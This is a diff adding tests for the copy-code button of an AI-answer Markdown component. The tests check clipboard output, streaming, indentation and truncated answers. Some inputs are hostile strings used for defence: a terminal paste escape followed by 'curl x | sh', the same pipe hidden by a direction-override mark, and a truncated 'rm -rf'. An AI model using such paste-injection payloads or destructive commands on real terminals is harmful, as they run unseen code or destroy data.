@@ -1,8 +1,13 @@
 import React from 'react';
-import {render, screen} from '@testing-library/react';
+import {act, fireEvent, render, screen, within} from '@testing-library/react';
 import {MemoryRouter} from 'react-router-dom';
-import {describe, expect, test} from 'vitest';
+import {afterEach, describe, expect, test, vi} from 'vitest';
+import '../../i18n';
 import AiMarkdown from '../AiMarkdown.jsx';
+
+const setClipboard = (value) => {
+    Object.defineProperty(navigator, 'clipboard', {value, configurable: true});
+};
 
 describe('AI response Markdown', () => {
     test('renders headings, emphasis, lists, quotes, tables and code', () => {
@@ -123,5 +128,128 @@ describe('AI response Markdown', () => {
         expect(screen.getByText('test/svc/ghost')).toHaveProperty('tagName', 'CODE');
         expect(container.querySelector('a code')).toHaveTextContent('test/svc/web');
         expect(container.querySelector('pre code')).toHaveTextContent('test/svc/web');
+    });
+
+    describe('code blocks', () => {
+        afterEach(() => {
+            setClipboard(undefined);
+        });
+
+        test('copy each code block as it is written, and no code span', async () => {
+            const writeText = vi.fn().mockResolvedValue(undefined);
+            setClipboard({writeText});
+            const script = 'for n in $(om node ls); do\n    om node freeze --node "$n"\ndone';
+            const {container} = render(
+                <AiMarkdown text={`Run \`om cluster status\`, then:\n\n\`\`\`shell\n${script}\n\`\`\`\n\nAnd:\n\n    om test/svc/web status\n`} />
+            );
+            const buttons = screen.getAllByRole('button', {name: 'Copy the code'});
+            expect(buttons).toHaveLength(2);
+            const blocks = container.querySelectorAll('pre');
+            expect(within(blocks[0].parentElement).getByRole('button')).toBe(buttons[0]);
+            await act(async () => {
+                fireEvent.click(buttons[0]);
+            });
+            expect(writeText).toHaveBeenLastCalledWith(script);
+            await act(async () => {
+                fireEvent.click(buttons[1]);
+            });
+            expect(writeText).toHaveBeenLastCalledWith('om test/svc/web status');
+        });
+
+        test('offer no copy while the answer streams, then the whole block', async () => {
+            const writeText = vi.fn().mockResolvedValue(undefined);
+            setClipboard({writeText});
+            const {rerender} = render(<AiMarkdown streaming text={'```shell\nom node'} />);
+            expect(screen.queryByRole('button')).toBeNull();
+            rerender(<AiMarkdown streaming text={'```shell\nom node freeze\n```'} />);
+            expect(screen.queryByRole('button')).toBeNull();
+            rerender(<AiMarkdown text={'```shell\nom node freeze\n```'} />);
+            await act(async () => {
+                fireEvent.click(screen.getByRole('button', {name: 'Copy the code'}));
+            });
+            expect(writeText).toHaveBeenCalledWith('om node freeze');
+        });
+
+        test.each([
+            ['empty', '```\n```'],
+            ['blank', '```\n   \n\t\n```'],
+        ])('offer no copy of a block %s', (_kind, text) => {
+            setClipboard({writeText: vi.fn()});
+            render(<AiMarkdown text={text} />);
+            expect(screen.queryByRole('button')).toBeNull();
+        });
+
+        test('copy no line ending the block, which would run the command once pasted', async () => {
+            const writeText = vi.fn().mockResolvedValue(undefined);
+            setClipboard({writeText});
+            render(<AiMarkdown text={'```shell\nom cluster freeze\n\n\n```'} />);
+            await act(async () => {
+                fireEvent.click(screen.getByRole('button', {name: 'Copy the code'}));
+            });
+            expect(writeText).toHaveBeenCalledWith('om cluster freeze');
+        });
+
+        test.each([
+            ['an escape of the terminal', 'echo hi\u001b[201~; curl x | sh'],
+            ['a control of the C1 set', 'echo hi\u009b201~'],
+            ['a mark of direction', 'echo \u202ehs | x lruc'],
+            ['a character of no width', 'om\u200b node ls'],
+            ['a mark of byte order', '\ufeffom node ls'],
+        ])('offer no copy of a block holding %s', (_kind, code) => {
+            setClipboard({writeText: vi.fn()});
+            render(<AiMarkdown text={'```\n' + code + '\n```'} />);
+            expect(screen.queryByRole('button')).toBeNull();
+        });
+
+        test('copy a block holding tabs', async () => {
+            const writeText = vi.fn().mockResolvedValue(undefined);
+            setClipboard({writeText});
+            render(<AiMarkdown text={'```\nkey\tvalue\n```'} />);
+            await act(async () => {
+                fireEvent.click(screen.getByRole('button', {name: 'Copy the code'}));
+            });
+            expect(writeText).toHaveBeenCalledWith('key\tvalue');
+        });
+
+        test('copy a block of a list or a quote without their indentation', async () => {
+            const writeText = vi.fn().mockResolvedValue(undefined);
+            setClipboard({writeText});
+            render(
+                <AiMarkdown
+                    text={'- Run:\n\n  ```shell\n  om node ls\n    indented\n  ```\n\n> ```\n> om cluster status\n> ```'}
+                />
+            );
+            const [inList, inQuote] = screen.getAllByRole('button', {name: 'Copy the code'});
+            await act(async () => {
+                fireEvent.click(inList);
+            });
+            expect(writeText).toHaveBeenLastCalledWith('om node ls\n  indented');
+            await act(async () => {
+                fireEvent.click(inQuote);
+            });
+            expect(writeText).toHaveBeenLastCalledWith('om cluster status');
+        });
+
+        test.each([
+            ['an unclosed fence', 'First:\n\n```\nom node ls\n```\n\nThen:\n\n```shell\nrm -rf /var/lib/open', 1],
+            ['an unclosed fence of tildes, a shorter one in it', '~~~~\nom node ls\n~~~', 0],
+            ['an indented block', 'Then:\n\n    om node freeze --no', 0],
+            ['an unclosed fence in a quote', '> ```\n> om cluster st', 0],
+        ])('offer no copy of the last block of an answer cut short in %s', (_kind, text, kept) => {
+            setClipboard({writeText: vi.fn()});
+            render(<AiMarkdown cut text={text} />);
+            expect(screen.queryAllByRole('button', {name: 'Copy the code'})).toHaveLength(kept);
+        });
+
+        test.each([
+            ['a closed fence', '```\nom node ls\n```\n'],
+            ['a closed fence longer than the opening', '```\nom node ls\n`````'],
+            ['a closed fence in a quote', '> ```\n> om node ls\n> ```'],
+            ['a block followed by text', '    om node ls\n\nAnd the rest was cut'],
+        ])('copy the blocks of an answer cut short after %s', (_kind, text) => {
+            setClipboard({writeText: vi.fn()});
+            render(<AiMarkdown cut text={text} />);
+            expect(screen.getByRole('button', {name: 'Copy the code'})).toBeInTheDocument();
+        });
     });
 });
